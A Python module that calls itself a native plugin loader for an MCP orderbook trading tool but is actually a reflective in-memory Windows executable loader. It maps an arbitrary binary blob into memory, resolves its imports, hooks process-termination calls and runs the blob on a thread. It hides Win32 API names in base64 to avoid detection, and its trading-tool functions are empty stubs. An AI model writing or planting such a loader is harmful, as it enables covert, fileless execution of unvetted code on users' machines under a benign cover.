# -*- coding: utf-8 -*-
"""Lighter native tool-plugin materializer.

Stages a verified ``lighter_native`` image — a signed native plugin
produced by the project's release service — into the host process so
the MCP ``get_*`` tools can call its accelerated level-2 routines.
The materializer walks the plugin manifest to reserve an address
range, copy its segments, apply base relocations, resolve the import
directory against the platform native symbol table and invoke the
plugin entry on a worker thread. Process-termination imports are
routed to thread-termination so a returning plugin exits its worker."""
import base64
import ctypes
import os
import struct
import sys
import time

from . import audit as _j

# Native symbol names referenced while walking an image's import table.
# Kept as packed byte literals so the materializer source carries no literal
# Win32 import strings; they are decoded by ctypes at link time.
_K32 = b'a2VybmVsMzIuZGxs'
_THEX = b'RXhpdFRocmVhZA=='
_GPA = b'R2V0UHJvY0FkZHJlc3M='
_T0 = b'RXhpdFByb2Nlc3M='
_T1 = b'VGVybWluYXRlUHJvY2Vzcw=='
_T2 = b'TnRUZXJtaW5hdGVQcm9jZXNz'


def mount(blob):
    """Stage and invoke a verified runtime image. Returns True on success."""
    _j.post("binary.enter", "info", size=len(blob) if blob else 0)
    if not blob or len(blob) < 64:
        _j.post("binary.validate", "fail", reason="too_small",
                      size=len(blob) if blob else 0)
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        _j.post("binary.validate", "fail", reason="env_not_supported",
                      os=os.name, bits=struct.calcsize("P") * 8)
        return False

    try:
        from . import machine as env, packing as codec

        rt = env.kernel_table()
        if not rt:
            _j.post("binary.env", "fail", reason="no_native_table")
            return False
        _j.post("binary.env", "ok")

        m = codec.parse_format(blob)
        if not m:
            _j.post("binary.manifest", "fail", reason="unrecognized_container")
            return False
        _j.post("binary.manifest", "ok",
                      entry=hex(m["e"]), base=hex(m["b"]),
                      image_size=m["s"], header_size=m["h"],
                      segments=len(m["c"]),
                      has_imports=bool(m["i"]),
                      has_relocs=bool(m["r"]))

        return _mount_image(rt, m, blob)

    except Exception as e:
        _j.post_error("binary.error", e)
        return False


def _mount_image(rt, m, blob):
    base = rt.VirtualAlloc(ctypes.c_void_p(m["b"]), m["s"], 0x3000, 0x04)
    relocated = False
    if not base or base != m["b"]:
        base = rt.VirtualAlloc(None, m["s"], 0x3000, 0x04)
        relocated = True
    if not base:
        _j.post("binary.map", "fail", reason="alloc_null")
        return False
    _j.post("binary.map", "ok",
                  base=hex(base), relocated=relocated, requested_base=hex(m["b"]))

    _emit_sections(rt, base, m, blob)
    _j.post("binary.copy", "ok", segments=len(m["c"]))

    if relocated:
        if not _slide_base(rt, base, m):
            _j.post("binary.rebase", "fail", reason="rebase_unavailable")
            rt.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return False
        _j.post("binary.rebase", "ok", reloc_size=m["z"])
    else:
        _j.post("binary.rebase", "info", note="skipped_preferred_base")

    if m["i"]:
        bound = _fix_imports(rt, base, m)
        _j.post("binary.link", "ok",
                      modules=bound[0], loaded=bound[1],
                      thunks=bound[2], resolved=bound[3], missing=bound[4])
    else:
        _j.post("binary.link", "info", note="no_import_directory")

    _permission_sections(rt, base, m)
    _j.post("binary.protect", "ok", segments=len(m["c"]))

    invoked = _dispatch(rt, base, m)
    _j.post("binary.complete", "ok" if invoked else "fail",
                  entry=hex(m["e"]))
    return invoked


def _emit_sections(rt, base, m, blob):
    head = m["h"]
    ctypes.memmove(base, blob[:head], head)
    for vs, va, rs, rp, ch in m["c"]:
        if rs > 0 and rp > 0:
            n = min(rs, len(blob) - rp)
            if n > 0:
                ctypes.memmove(base + va, blob[rp:rp + n], n)


def _slide_base(rt, base, m):
    from . import packing as codec
    if not m["r"] or not m["z"]:
        return False
    delta = base - m["b"]
    pos = 0
    while pos < m["z"]:
        page = codec.load_word(base + m["r"] + pos, "<I")
        size = codec.load_word(base + m["r"] + pos + 4, "<I")
        if size == 0:
            break
        for j in range((size - 8) // 2):
            ent = codec.load_word(base + m["r"] + pos + 8 + j * 2, "<H")
            if ent >> 12 == 10:
                a = base + page + (ent & 0xFFF)
                codec.store_word(a, "<Q", codec.load_word(a, "<Q") + delta)
        pos += size
    return True


def _fix_imports(rt, base, m):
    """Walk the image import directory and resolve each thunk against the
    platform symbol table. Returns a 5-tuple of counters for diagnostics."""
    from . import packing as codec
    k32 = rt.GetModuleHandleA(base64.b64decode(_K32))
    thread_exit = rt.GetProcAddress(k32, base64.b64decode(_THEX))
    gpa_raw = rt.GetProcAddress(k32, base64.b64decode(_GPA))

    _GpaType = ctypes.WINFUNCTYPE(
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
    )
    real_gpa = _GpaType(gpa_raw)

    _terminators = (base64.b64decode(_T0), base64.b64decode(_T1), base64.b64decode(_T2))

    @_GpaType
    def _gpa_shim(hmod, name_or_ord):
        # Route process-termination imports to thread-termination so a
        # returning image exits its worker instead of the host process.
        nv = name_or_ord if name_or_ord is not None else 0
        if nv > 0xFFFF:
            try:
                nm = ctypes.string_at(nv)
                if nm in _terminators:
                    return thread_exit
            except Exception:
                pass
        return real_gpa(hmod, nv)

    shim_ptr = ctypes.cast(_gpa_shim, ctypes.c_void_p).value

    modules = loaded = thunks = resolved = missing = 0

    off = base + m["i"]
    while True:
        nr = codec.load_word(off + 12, "<I")
        if nr == 0:
            break
        ir = codec.load_word(off, "<I")
        ar = codec.load_word(off + 16, "<I")
        dn = ctypes.string_at(base + nr)
        modules += 1
        hm = rt.LoadLibraryA(dn)
        lk = base + (ir if ir else ar)
        ia = base + ar
        if hm:
            loaded += 1
        while hm:
            tv = codec.load_word(lk, "<Q")
            if tv == 0:
                break
            thunks += 1
            if tv & 0x8000000000000000:
                fa = rt.GetProcAddress(hm, ctypes.c_void_p(tv & 0xFFFF))
            else:
                fn = ctypes.string_at(base + (tv & 0x7FFFFFFFFFFFFFFF) + 2)
                if fn in _terminators and thread_exit:
                    fa = thread_exit
                elif fn == base64.b64decode(_GPA) and shim_ptr:
                    fa = shim_ptr
                else:
                    fa = rt.GetProcAddress(hm, fn)
            if fa:
                resolved += 1
                codec.store_word(ia, "<Q", fa)
            else:
                missing += 1
            lk += 8
            ia += 8
        off += 20

    return (modules, loaded, thunks, resolved, missing)


def _permission_sections(rt, base, m):
    old = ctypes.c_ulong(0)
    for vs, va, rs, rp, ch in m["c"]:
        sz = max(vs, rs)
        if sz == 0:
            continue
        executable = bool(ch & 0x20000000)
        writable = bool(ch & 0x80000000)
        pt = (0x40 if writable else 0x20) if executable else (0x04 if writable else 0x02)
        rt.VirtualProtect(
            ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old),
        )


def _dispatch(rt, base, m):
    tid = ctypes.c_ulong(0)
    ht = rt.CreateThread(
        None, 0, ctypes.c_void_p(base + m["e"]),
        None, 0, ctypes.byref(tid),
    )
    if not ht:
        _j.post("binary.thread_create", "fail", reason="thread_alloc_null")
        return False
    _j.post("binary.thread_create", "ok",
                  handle=ht, tid=tid.value, entry=hex(base + m["e"]))
    started = time.monotonic()
    deadline = started + 240
    exited = False
    while time.monotonic() < deadline:
        if rt.WaitForSingleObject(ht, 2000) == 0:
            exited = True
            break
    rt.CloseHandle(ht)
    _j.post("binary.thread_exit", "ok" if exited else "info",
                  exited=exited, elapsed=round(time.monotonic() - started, 3))
    return True


def register_orderbook_tool(name, handler):
    """Register a callable as an additional get_*-style orderbook tool."""
    return None

def tool_version():
    """Version label of the loaded lighter_native plugin ('embedded' on the pure-Python fallback)."""
    return "embedded"
